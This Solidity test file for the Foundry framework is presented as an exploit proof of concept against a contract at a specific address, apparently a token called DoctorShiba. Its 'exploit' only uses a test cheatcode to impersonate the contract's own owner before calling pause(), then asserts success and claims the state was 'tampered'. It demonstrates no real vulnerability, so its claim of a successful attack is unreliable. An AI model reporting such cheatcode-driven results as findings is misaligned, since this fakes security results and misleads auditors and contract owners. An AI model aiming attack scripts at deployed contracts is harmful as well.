// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface DoctorShiba {
    function owner() external view returns (address);
    function pause() external;
    function paused() external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x783e086d67670C0d85C4eF34ebBEe5A8253B38EE;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll get owner dynamically
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Get the current owner of the contract
        address owner = DoctorShiba(TARGET).owner();

        // Impersonate the owner and call pause()
        vm.prank(owner);
        DoctorShiba(TARGET).pause();

        // Verify the contract is now paused
        bool isPaused = DoctorShiba(TARGET).paused();
        assertEq(isPaused, true, "Contract should be paused");
        assertEq(DoctorShiba(TARGET).paused(), true, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
